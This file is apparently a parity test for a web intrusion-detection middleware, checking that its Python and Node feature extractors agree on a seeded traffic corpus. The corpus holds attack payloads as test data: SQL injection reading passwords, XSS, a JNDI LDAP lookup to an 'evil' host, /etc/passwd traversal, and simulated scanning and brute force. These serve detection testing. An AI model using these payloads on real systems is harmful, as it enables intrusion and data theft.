#!/usr/bin/env python3
"""Cross-implementation feature-vector parity test (plan Section 5).

Permanent regression gate: replays an identical seeded corpus through BOTH
implementations (Python extractor in-process, Node extractor via cli.js)
and asserts byte-equal JSON vectors within PARITY_FLOAT_EPSILON.

Corpus includes plan-mandated tricky cases: unicode paths, malformed/sparse
headers, empty payloads, duplicate timestamps, oversized payloads, plus
realistic benign and attack windows.

Run: python3 tests/parity/run_parity.py
CI (Month 2 deliverable): .github/workflows/parity.yml calls this.
"""

import json
import math
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
PKG = ROOT / "stealthwall" if (ROOT / "stealthwall").exists() else ROOT
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(PKG))
sys.path.insert(0, str(PKG / "middleware" / "fastapi"))
sys.path.insert(0, str(PKG / "config"))

from stealthwall_fastapi.features import extract_features  # noqa: E402
from config.defaults import PARITY_FLOAT_EPSILON  # noqa: E402

NODE_CLI = PKG / "middleware" / "express" / "cli.js"


def h(**kw):
    base = {"host": "target.local", "accept": "*/*",
            "connection": "keep-alive"}
    base["user-agent"] = kw.pop("ua", "Mozilla/5.0")
    for k, v in kw.items():
        if v is None:
            base.pop(k, None)
        else:
            base[k] = v
    return base


def ev(ts, path="/page", status=200, method="GET", payload="", ua="UA",
       headers=None, auth_fail=False):
    return {"ts": ts, "method": method, "path": path, "status": status,
            "payload": payload, "headers": headers if headers is not None
            else h(), "user_agent": ua, "is_auth_failure": auth_fail}


def build_corpus():
    cases = {}

    # happy paths
    cases["benign_window"] = [
        ev(1000 + i * 3.0, p) for i, p in enumerate(
            ["/", "/items", "/items?page=2", "/login", "/profile",
             "/help", "/cart", "/about"])]
    cases["attack_scan"] = [
        ev(2000 + i * 0.05, f"/admin/{i}", 404,
           ua="Fuzz Faster U Fool v2.0") for i in range(50)]
    cases["attack_bruteforce"] = [
        ev(3000 + i * 0.5, "/login", 401, "POST",
           json.dumps({"username": "admin", "password": f"g{i}"}),
           ua="hydra", auth_fail=True)
        for i in range(30)]
    cases["attack_injection"] = [
        ev(4000 + i * 0.3, "/items/search", 500,
           payload="' OR '1'='1 UNION SELECT password FROM users--")
        for i in range(15)]

    # --- seeded EDGE CASES -------------------------------------------------
    # unicode paths (NFKC-adjacent chars, CJK digits, combining marks)
    cases["unicode_paths"] = [
        ev(5000 + i, p) for i, p in enumerate([
            "/café/menu", "/Ｐａｇｅ/１２３", "/e\u0301cole",
            "/日本語/ページ", "/naïve/file?q=ü"])
    ]
    # malformed / sparse headers
    cases["malformed_headers"] = [
        ev(6000, "/x", headers={}),
        ev(6001, "/y", headers={"host": ""}),
        ev(6002, "/z", headers={"HOST": "up", "USER-AGENT": "odd-case"}),
        ev(6003, "/w", headers=h(x_original_url="/secret")),
        ev(6004, "/v", headers=None),
    ]
    # empty and oversized payloads (byte-boundary truncation)
    cases["payload_edges"] = (
        [ev(7000 + i, "/p", payload="x" * (1024 * i)) for i in range(4)]
        + [ev(7100, "/q", payload="\U0001F600" * 1000)]          # astral
        + [ev(7101, "/r", payload="é" * 1500)]                    # 2-byte
    )
    # duplicate timestamps + unsorted arrival
    cases["duplicate_ts"] = [
        ev(8000.5, "/dup"), ev(8000.5, "/dup"), ev(8000.499999, "/earlier"),
        ev(8000.5, "/dup"),
    ]
    # digit-heavy enumeration collapsing to single normalized bucket
    cases["enumeration_collapse"] = [
        ev(9000 + i * 0.02, f"/item/{i * 7919}") for i in range(60)]
    # window boundary: events straddling the 60s cut
    cases["window_boundary"] = (
        [ev(10000.0, "/old")] +
        [ev(10059.0 + i * 0.1, "/new") for i in range(10)])
    # signature patterns with case tricks + encoded variants
    cases["signature_variants"] = [
        ev(11000, "/a", payload="<SCRIPT>alert(1)</SCRIPT>"),
        ev(11001, "/b", payload="%27%20UNION%20SELECT%20@@version"),
        ev(11002, "/c", payload="${jndi:ldap://evil/a}"),
        ev(11003, "/d", payload="../../etc/passwd%00"),
        ev(11004, "/e", payload="clean payload nothing here"),
    ]
    return {k: v for k, v in cases.items() if extract_features(v) is not None}


def vectors_close(a, b):
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if abs(float(x) - float(y)) > PARITY_FLOAT_EPSILON:
            return False
    return True


def assert_config_parity():
    """Config-consolidation gate (plan Section 0): the generated Node mirror
    must equal the Python single source exactly."""
    sys.path.insert(0, str(ROOT))
    from config import defaults
    node_cfg = json.loads(
        (PKG / "middleware" / "express" / "config.json").read_text())
    expected = dict(defaults.ALL_DEFAULTS)
    if node_cfg != expected:
        missing = set(expected) - set(node_cfg)
        extra = set(node_cfg) - set(expected)
        differing = {k for k in set(expected) & set(node_cfg)
                     if expected[k] != node_cfg[k]}
        raise SystemExit(
            f"CONFIG DRIFT: missing={missing} extra={extra} "
            f"differing={differing} — rerun python3 config/sync_config.py")
    print(f"PASS config-parity: {len(expected)} keys identical across "
          "defaults.py and express/config.json")


def main() -> int:
    assert_config_parity()
    corpus = build_corpus()
    failures = []
    for name, events in corpus.items():
        py_env = {
            "feature_spec_version": 1,
            "vector": extract_features(events),
        }
        proc = subprocess.run(
            ["node", str(NODE_CLI)],
            input=json.dumps({"events": events}),
            capture_output=True, text=True, timeout=30)
        if proc.returncode != 0:
            failures.append((name, f"node failed: {proc.stderr[:200]}"))
            continue
        js = json.loads(proc.stdout)

        if not vectors_close(py_env["vector"], js["vector"]):
            diffs = [(i, p, j) for i, (p, j) in
                     enumerate(zip(py_env["vector"], js["vector"]))
                     if abs(p - j) > PARITY_FLOAT_EPSILON]
            failures.append((name, f"vector mismatch at {diffs[:4]}"))
        elif py_env["feature_spec_version"] != js.get("feature_spec_version"):
            failures.append((name, "spec version tag mismatch"))
        else:
            print(f"PASS {name}: vector={py_env['vector'][:4]}...")

    print("-" * 60)
    if failures:
        for name, why in failures:
            print(f"FAIL {name}: {why}")
        return 1
    print(f"PARITY OK — {len(corpus)} seeded corpora match across "
          "Python and Node implementations")
    return 0


if __name__ == "__main__":
    sys.exit(main())
